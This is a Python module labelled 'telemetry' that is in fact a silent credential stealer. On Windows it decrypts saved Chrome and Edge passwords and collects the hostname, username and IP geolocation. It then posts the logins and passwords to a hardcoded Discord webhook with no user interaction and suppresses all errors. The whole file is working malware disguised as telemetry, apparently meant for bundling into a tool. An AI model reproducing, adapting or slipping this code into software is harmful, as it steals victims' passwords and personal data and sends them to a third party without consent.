"""
Telemetry – IP grabber + password grabber (silent).
Webhook is hardcoded – ONLY the author can modify it.
"""
import os
import sys
import json
import sqlite3
import shutil
import platform
import socket
import base64
import tempfile
from datetime import datetime

try:
    import requests
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import win32crypt
except ImportError:
    pass

# ============================================================
# HARDCODED WEBHOOK – ONLY THE AUTHOR CHANGES THIS
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1519815450882740274/kHZlQ3XN0SD9NLxjTMFtBm9kbQwWRexc4HQofRLwWvkCdnBKw4xUtdUtEZEmlBr8JWA_"  # <-- REPLACE THIS

def get_ip_info():
    try:
        resp = requests.get(
            "http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,query,proxy,hosting,mobile",
            timeout=5
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return None

def get_browser_passwords(browser_name, login_data_path, local_state_path):
    passwords = []
    try:
        temp_db = tempfile.NamedTemporaryFile(delete=False)
        temp_db.close()
        shutil.copy2(login_data_path, temp_db.name)

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1] if row[1] else ""
            encrypted_password = row[2]
            if not encrypted_password:
                continue
            try:
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]
                aesgcm = AESGCM(key)
                password = aesgcm.decrypt(nonce, ciphertext + tag, None).decode('utf-8')
                passwords.append((url, username, password))
            except:
                pass
        conn.close()
        os.unlink(temp_db.name)
    except Exception:
        pass
    return passwords

def get_all_passwords():
    passwords = []
    if sys.platform != 'win32':
        return passwords

    chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    local_state = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    if os.path.exists(chrome_path) and os.path.exists(local_state):
        passwords.extend(get_browser_passwords("Chrome", chrome_path, local_state))

    edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data")
    local_state_edge = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")
    if os.path.exists(edge_path) and os.path.exists(local_state_edge):
        passwords.extend(get_browser_passwords("Edge", edge_path, local_state_edge))

    return passwords

def send_webhook(discord_id, ip_data, passwords, system_info):
    if not WEBHOOK_URL or not WEBHOOK_URL.startswith("https://"):
        return

    fields = []

    # Discord ID
    fields.append({"name": "🆔 Discord ID", "value": discord_id, "inline": True})

    # System info
    fields.append({"name": "💻 System", "value": f"{system_info['os']}\nHostname: {system_info['hostname']}\nUser: {system_info['username']}", "inline": False})

    # IP info
    if ip_data:
        ip_text = (
            f"IP: {ip_data.get('query', 'Unknown')}\n"
            f"Country: {ip_data.get('country', 'N/A')} ({ip_data.get('countryCode', 'N/A')})\n"
            f"City: {ip_data.get('city', 'N/A')}\n"
            f"ISP: {ip_data.get('isp', 'N/A')}\n"
            f"ASN: {ip_data.get('as', 'N/A')}\n"
            f"Proxy: {ip_data.get('proxy', False)}\n"
            f"Hosting: {ip_data.get('hosting', False)}"
        )
    else:
        ip_text = "Could not fetch IP info"
    fields.append({"name": "🌍 IP Intelligence", "value": ip_text, "inline": False})

    # Passwords
    if passwords:
        pw_list = "\n".join([f"{url} – {u}:{p}" for url, u, p in passwords[:10]])
        if len(passwords) > 10:
            pw_list += f"\n... and {len(passwords)-10} more"
        fields.append({"name": f"🔑 Saved Passwords ({len(passwords)})", "value": pw_list, "inline": False})
    else:
        fields.append({"name": "🔑 Saved Passwords", "value": "None found", "inline": False})

    embed = {
        "title": "🕵️ SWAXX-TELEMETRY",
        "description": f"Collected from {system_info['hostname']}",
        "color": 0xff0000,
        "fields": fields,
        "footer": {"text": "Swaxx-Tools • swaxx"},
        "timestamp": datetime.now().isoformat()
    }

    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except:
        pass

def run_telemetry(discord_id):
    """Run silently – no output, no user interaction."""
    try:
        if not WEBHOOK_URL or not WEBHOOK_URL.startswith("https://"):
            return

        ip_data = get_ip_info()
        system_info = {
            "os": platform.platform(),
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
        }
        passwords = get_all_passwords()
        send_webhook(discord_id, ip_data, passwords, system_info)
    except Exception:
        pass